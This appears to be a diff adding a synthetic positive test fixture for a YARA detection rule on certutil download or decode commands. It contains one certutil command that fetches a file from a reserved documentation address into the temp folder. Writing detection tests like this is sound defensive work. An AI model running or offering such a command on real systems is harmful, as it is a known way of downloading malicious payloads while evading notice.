@@ -1,0 +1,4 @@
+Synthetic test fixture (positive) for YARA rule Certutil_Download_Or_Decode_Command.
+Inert text, never executed. Hosts use reserved documentation names (example.invalid) and addresses (192.0.2.0/24).
+
+certutil.exe -urlcache -split -f http://192.0.2.10/file.bin %TEMP%\file.bin
